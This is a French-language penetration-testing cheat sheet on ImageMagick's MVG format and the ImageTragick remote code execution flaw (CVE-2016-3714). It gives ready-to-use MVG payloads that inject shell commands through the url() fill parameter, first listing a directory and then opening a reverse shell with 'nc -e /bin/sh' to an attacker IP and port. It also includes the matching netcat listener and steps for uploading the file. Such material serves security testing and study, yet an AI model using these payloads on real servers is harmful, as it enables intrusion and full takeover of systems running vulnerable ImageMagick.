# MVG

<img src="logo_imagemagick.png" title="" alt="" height="200">

**Facteur de risque** : RCE

**Extensions** : `.mvg`

**Description** : Le **Magick Vector Graphics** ou **MVG** est un langage permettant d'écrire des graphiques vectoriels bidimensionnels pour le logiciel **ImageMagick**. Exemlple :

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg)'
pop graphic-context
```

## Sommaire

- ImageTragick

## RCE : ImageTragick CVE-2016–3714

<img src="logo_imagetragick.png" title="" alt="" height="200">

**ImageMagick** est un logiciel utilisé pour créer, modifier (redimensionner), convertir ou afficher des fichiers d'images dans un très grand nombre de formats.

ImageMagick possède plusieurs failles, donc une qui permet d'exécuter du code arbitraire à distance : https://imagetragick.com

### Pré-requis

- ImageMagick <= 6.9.3-9 est utilisé par le serveur web

### Exploitation

1. Copier le code suivant, qui permet de lister le répertoire :
   
   ```shell
   push graphic-context
   viewbox 0 0 640 480
   fill 'url(https://example.com/image.jpg";|ls "-la)'
   pop graphic-context
   ```
   
    La fonction `url()` est censé contenir l'URL d'une image (`https://example.com/image.jpg`). Ici on injecte le code `";|ls "-la` pour lister le répertoire.

2. Téléverser ce fichier sur l'application.

Comme l'exploitation se passe au moment du téléversement, l'utilisateur peut ne pas voir pas le résultat des commandes. Mais un **reverse shell** est possible !

1. Copier le code suivant :
   
   ```shell
   push graphic-context
   viewbox 0 0 640 480
   fill 'url(https://example.com/image.jpg";|nc -e /bin/sh IP_ADDRESS "PORT)'
   pop graphic-context
   ```
   
   La fonction `url()` est censé contenir l'URL d'une image (`https://example.com/image.jpg`). Ici, on injecte le code `";|nc -e /bin/sh IP_ADDRESS_HERE "PORT_HERE` pour avoir un reverse shell.

2. Remplacer `IP_ADRESS` et `PORT` dans le code (faire attention aux guillemets présents), puis enregistrer sous forme d'image (**rce.mvg**). Par exemple :
   
   ```shell
   fill 'url(https://example.com/image.jpg";|nc -e /bin/sh 127.0.0.1 "1234)'
   ```

3. Écouter votre port :
   
   ```shell
   nc -lnvp 1234
   ```

4. Téléverser ce fichier sur l'application. 
   Au moment du téléversement, ImageMagick va traiter l'image, et exécuter en le code.

## References

- 
- ImageTragick : 
  - https://imagetragick.com
  - [GitHub - ImageTragick/PoCs: Proof of Concepts for CVE-2016–3714](https://github.com/ImageTragick/PoCs)
  - [oss-security - Re: ImageMagick Is On Fire -- CVE-2016-3714](https://www.openwall.com/lists/oss-security/2016/05/03/18)

## Todo

- AJouter les autres vulnérabilités d'ImageMagick

- Ajouter pour les autres types d'images d'ImageMagick : PNG, JPEG, GIF, HEIC, TIFF, [DPX](https://imagemagick.org/script/motion-picture.php), [EXR](https://imagemagick.org/script/high-dynamic-range.php), WebP, Postscript, PDF, and SVG
